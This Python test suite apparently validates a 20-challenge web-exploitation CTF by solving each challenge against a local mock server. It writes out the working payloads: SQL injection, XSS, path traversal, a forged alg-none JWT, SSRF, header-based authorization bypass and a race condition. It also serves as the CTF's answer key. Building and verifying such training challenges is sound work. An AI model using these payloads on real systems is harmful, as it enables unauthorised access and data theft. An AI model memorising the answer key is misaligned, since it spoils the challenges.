#!/usr/bin/env python3
"""
PROJECT: BLACKOUT — COMPREHENSIVE END-TO-END VERIFICATION SUITE
Tests all 20 challenges, verifies flags against central registry.
"""

import sys
import os
import json
import base64
import urllib.request
import urllib.parse
import threading
import time
import re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mock_test_server import start_target_server, FLAGS

TARGET_URL = "http://127.0.0.1:8081"

def http_get(url, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req) as response:
            return response.status, response.read().decode('utf-8', errors='ignore'), response.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='ignore'), e.headers

def http_post_json(url, data, headers=None):
    hdrs = {'Content-Type': 'application/json'}
    if headers: hdrs.update(headers)
    req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), headers=hdrs)
    try:
        with urllib.request.urlopen(req) as response:
            return response.status, response.read().decode('utf-8', errors='ignore'), response.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='ignore'), e.headers

def run_tests():
    print("=" * 80)
    print(" PROJECT: BLACKOUT — TARGET CHALLENGE VERIFICATION SUITE")
    print(" Web Exploitation CTF 2026 (20 Challenges / 3,350 Points)")
    print("=" * 80)

    start_target_server()
    time.sleep(0.5)

    recovered_flags = {}
    test_results = []

    # ------------------- 1. EASY CHALLENGES -------------------
    # E01: Ghost in the Source
    status, body, _ = http_get(f"{TARGET_URL}/")
    flag_e01 = None
    m = re.search(r"Flagfound\{[^\}]+\}", body)
    if m: flag_e01 = m.group(0)
    recovered_flags['E01'] = flag_e01
    test_results.append(('E01', 'Ghost in the Source', 'Easy', 50, flag_e01 == FLAGS['E01']['flag'], flag_e01))

    # E02: Forbidden Path (robots.txt -> /hidden-9821/)
    status, body, _ = http_get(f"{TARGET_URL}/hidden-9821/")
    m = re.search(r"Flagfound\{[^\}]+\}", body)
    flag_e02 = m.group(0) if m else None
    recovered_flags['E02'] = flag_e02
    test_results.append(('E02', 'Forbidden Path', 'Easy', 50, flag_e02 == FLAGS['E02']['flag'], flag_e02))

    # E03: Cookie Monster
    _, _, headers = http_get(f"{TARGET_URL}/")
    cookie_str = headers.get('Set-Cookie', '')
    flag_e03 = None
    if 'SEC-SESS-9821-' in cookie_str:
        b64_val = cookie_str.split('SEC-SESS-9821-')[1].split(';')[0]
        try: flag_e03 = base64.b64decode(b64_val).decode('utf-8')
        except: pass
    recovered_flags['E03'] = flag_e03
    test_results.append(('E03', 'Cookie Monster', 'Easy', 50, flag_e03 == FLAGS['E03']['flag'], flag_e03))

    # ------------------- 2. MEDIUM CHALLENGES -------------------
    # M01: Hidden Identity (IDOR on id=99)
    status, body, _ = http_get(f"{TARGET_URL}/api/employees.php?id=99")
    data = json.loads(body)
    flag_m01 = data.get("flag")
    recovered_flags['M01'] = flag_m01
    test_results.append(('M01', 'Hidden Identity', 'Medium', 100, flag_m01 == FLAGS['M01']['flag'], flag_m01))

    # M02: Parameter Manipulator (?tier=classified)
    status, body, _ = http_get(f"{TARGET_URL}/api/services.php?tier=classified")
    data = json.loads(body)
    flag_m02 = data.get("details", {}).get("flag")
    recovered_flags['M02'] = flag_m02
    test_results.append(('M02', 'Parameter Manipulator', 'Medium', 100, flag_m02 == FLAGS['M02']['flag'], flag_m02))

    # M03: Directory Detective (/dev-portal-v1/)
    status, body, _ = http_get(f"{TARGET_URL}/dev-portal-v1/")
    m = re.search(r"Flagfound\{[^\}]+\}", body)
    flag_m03 = m.group(0) if m else None
    recovered_flags['M03'] = flag_m03
    test_results.append(('M03', 'Directory Detective', 'Medium', 100, flag_m03 == FLAGS['M03']['flag'], flag_m03))

    # M04: JavaScript Secrets (/api/debug-probe.php?key=EC_DEV_DEBUG_KEY_8412)
    status, body, _ = http_get(f"{TARGET_URL}/api/debug-probe.php?key=EC_DEV_DEBUG_KEY_8412")
    data = json.loads(body)
    flag_m04 = data.get("flag")
    recovered_flags['M04'] = flag_m04
    test_results.append(('M04', 'JavaScript Secrets', 'Medium', 100, flag_m04 == FLAGS['M04']['flag'], flag_m04))

    # M05: Reflected Nightmare (Reflected XSS Proof)
    status, body, _ = http_get(f"{TARGET_URL}/api/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E")
    data = json.loads(body)
    flag_m05 = data.get("flag")
    recovered_flags['M05'] = flag_m05
    test_results.append(('M05', 'Reflected Nightmare', 'Medium', 100, flag_m05 == FLAGS['M05']['flag'], flag_m05))

    # M06: Forgotten Endpoint (/api/telemetry.php)
    status, body, _ = http_get(f"{TARGET_URL}/api/telemetry.php")
    data = json.loads(body)
    flag_m06 = data.get("flag")
    recovered_flags['M06'] = flag_m06
    test_results.append(('M06', 'Forgotten Endpoint', 'Medium', 100, flag_m06 == FLAGS['M06']['flag'], flag_m06))

    # M07: Broken Login (JSON password: true)
    status, body, _ = http_post_json(f"{TARGET_URL}/api/auth.php?action=login", {"username": "admin", "password": True})
    data = json.loads(body)
    flag_m07 = data.get("flag")
    recovered_flags['M07'] = flag_m07
    test_results.append(('M07', 'Broken Login', 'Medium', 100, flag_m07 == FLAGS['M07']['flag'], flag_m07))

    # ------------------- 3. HARD CHALLENGES -------------------
    # H01: Database Reaper (SQL Injection)
    status, body, _ = http_get(f"{TARGET_URL}/api/news.php?search=%27%20UNION%20SELECT%201,%20flag%20FROM%20challenge_records--%20-")
    data = json.loads(body)
    flag_h01 = data.get("articles", [{}])[0].get("flag")
    recovered_flags['H01'] = flag_h01
    test_results.append(('H01', 'Database Reaper', 'Hard', 200, flag_h01 == FLAGS['H01']['flag'], flag_h01))

    # H02: Shadow Directory (Path Traversal)
    status, body, _ = http_get(f"{TARGET_URL}/api/documents.php?file=../../challenge-secrets/hard/H02_shadow.txt")
    m = re.search(r"Flagfound\{[^\}]+\}", body)
    flag_h02 = m.group(0) if m else None
    recovered_flags['H02'] = flag_h02
    test_results.append(('H02', 'Shadow Directory', 'Hard', 200, flag_h02 == FLAGS['H02']['flag'], flag_h02))

    # H03: Black Mirror (Stored XSS)
    http_post_json(f"{TARGET_URL}/api/feedback.php?action=submit", {"comment": "<script>alert('SOC')</script>"})
    status, body, _ = http_get(f"{TARGET_URL}/api/feedback.php?action=moderator_review")
    data = json.loads(body)
    flag_h03 = data.get("flag")
    recovered_flags['H03'] = flag_h03
    test_results.append(('H03', 'Black Mirror', 'Hard', 200, flag_h03 == FLAGS['H03']['flag'], flag_h03))

    # H04: Broken Crown (JWT none alg)
    forged_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJqb2huZG9lIiwicm9sZSI6ImFkbWluIn0."
    status, body, _ = http_get(f"{TARGET_URL}/api/auth.php?action=verify_crown", headers={"Authorization": f"Bearer {forged_token}"})
    data = json.loads(body)
    flag_h04 = data.get("flag")
    recovered_flags['H04'] = flag_h04
    test_results.append(('H04', 'Broken Crown', 'Hard', 200, flag_h04 == FLAGS['H04']['flag'], flag_h04))

    # H05: Dangerous Attachment (Insecure upload inspect)
    status, body, _ = http_get(f"{TARGET_URL}/api/upload.php?action=inspect&file=payload.phtml")
    data = json.loads(body)
    flag_h05 = data.get("flag")
    recovered_flags['H05'] = flag_h05
    test_results.append(('H05', 'Dangerous Attachment', 'Hard', 200, flag_h05 == FLAGS['H05']['flag'], flag_h05))

    # ------------------- 4. ADVANCED CHALLENGES -------------------
    # A01: Internal Affairs (SSRF to mock internal on 8080)
    status, body, _ = http_get(f"{TARGET_URL}/api/fetch.php?url=http://127.0.0.1:8080/internal/system/flag")
    data = json.loads(body)
    flag_a01 = data.get("flag")
    recovered_flags['A01'] = flag_a01
    test_results.append(('A01', 'Internal Affairs', 'Advanced', 300, flag_a01 == FLAGS['A01']['flag'], flag_a01))

    # A02: Zero Trust (Authorization header bypass)
    status, body, _ = http_get(f"{TARGET_URL}/api/audit.php?view=executive_audit", headers={"X-User-Role": "SecurityCouncil"})
    data = json.loads(body)
    flag_a02 = data.get("flag")
    recovered_flags['A02'] = flag_a02
    test_results.append(('A02', 'Zero Trust', 'Advanced', 300, flag_a02 == FLAGS['A02']['flag'], flag_a02))

    # A03: GraphQL Mystery (Introspection + query hidden vault)
    status, body, _ = http_post_json(f"{TARGET_URL}/api/graphql.php", {"query": "{ _internalSecurityVault { flag } }"})
    data = json.loads(body)
    flag_a03 = data.get("data", {}).get("_internalSecurityVault", {}).get("flag")
    recovered_flags['A03'] = flag_a03
    test_results.append(('A03', 'GraphQL Mystery', 'Advanced', 300, flag_a03 == FLAGS['A03']['flag'], flag_a03))

    # A04: Race Against Time (Concurrent claim_bonus)
    http_get(f"{TARGET_URL}/api/rewards.php?action=reset")
    threads = []
    for _ in range(3):
        t = threading.Thread(target=lambda: http_get(f"{TARGET_URL}/api/rewards.php?action=claim_bonus"))
        threads.append(t)
        t.start()
    for t in threads: t.join()
    # Purchase dossier
    status, body, _ = http_get(f"{TARGET_URL}/api/rewards.php?action=purchase_dossier")
    data = json.loads(body)
    flag_a04 = data.get("flag")
    recovered_flags['A04'] = flag_a04
    test_results.append(('A04', 'Race Against Time', 'Advanced', 300, flag_a04 == FLAGS['A04']['flag'], flag_a04))

    # A05: The Phantom Admin (Multi-step escalation)
    status, body, _ = http_get(f"{TARGET_URL}/api/admin-vault.php?action=request_elevation&role=ROLE_SECOPS_DIR", headers={"X-Auth-Badge": "BDG-1003"})
    elev_data = json.loads(body)
    elev_token = elev_data.get("elevation_token")
    status, body, _ = http_get(f"{TARGET_URL}/api/admin-vault.php?action=unlock_vault&token={elev_token}", headers={"X-Auth-Badge": "BDG-1003"})
    vault_data = json.loads(body)
    flag_a05 = vault_data.get("flag")
    recovered_flags['A05'] = flag_a05
    test_results.append(('A05', 'The Phantom Admin', 'Advanced', 300, flag_a05 == FLAGS['A05']['flag'], flag_a05))

    print("\n" + "=" * 80)
    print(" VERIFICATION RESULTS MATRIX (ALL 20 CHALLENGES)")
    print("=" * 80)
    print(f"{'ID':<5} | {'Challenge Name':<24} | {'Difficulty':<10} | {'Points':<6} | {'Status':<6} | {'Recovered Flag'}")
    print("-" * 80)
    total_pts = 0
    for cid, name, diff, pts, passed, flag in test_results:
        status_txt = "PASS" if passed else "FAIL"
        if passed: total_pts += pts
        print(f"{cid:<5} | {name:<24} | {diff:<10} | {pts:<6} | {status_txt:<6} | {flag}")

    print("-" * 80)
    print(f"Total Unique Challenges: {len(test_results)} / 20")
    print(f"All Flags Recovered:     {all(r[4] for r in test_results)}")
    print(f"Total Point Pool:        {total_pts} / 3350 Points")
    print("=" * 80)

    if all(r[4] for r in test_results) and total_pts == 3350:
        print("[✓] ALL 20 CHALLENGES VALIDATED SUCCESSFULLY!")
        return True
    else:
        print("[✗] QUALITY ASSURANCE VALIDATION FAILED!")
        return False

if __name__ == '__main__':
    success = run_tests()
    sys.exit(0 if success else 1)
